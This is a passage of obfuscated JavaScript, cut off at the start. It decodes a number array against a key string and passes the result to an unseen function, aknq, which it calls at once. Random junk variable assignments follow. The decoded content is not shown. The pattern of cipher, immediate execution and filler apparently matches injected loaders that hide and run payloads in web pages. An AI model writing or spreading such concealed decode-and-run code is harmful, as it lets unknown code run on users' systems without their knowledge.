67, 59, 63, 58, 63, 148, 165, 157, 162, 146, 152, 144, 157, 150, 170, 154, 153, 160, 164, 89, 95, 108, 67, 59, 63, 58, 179, 62, 64, 58, 179, 62, 64, 62, 64, 58, 166, 149, 156, 144, 169, 165, 151, 163, 170, 89, 95, 108, 67, 59, 63],
    chrtu = function() {
        for (var dfmopx; cfimq < cqst.length; cfimq += 1) {
            var bfjlv = cfimq % agjknw.length + 1;
            var exwzur = agjknw.substring(cfimq % agjknw.length, bfjlv);
            var bjlmt = cqst[cfimq];
            jopqs += ceknqx(bjlmt - exwzur.charCodeAt(0));
        }
        aknq(jopqs);
    };
chrtu();
aefnv = '';
zacluy = 52520;
oqrx = '';
fwzb = "fwzb";
befmlz = '';

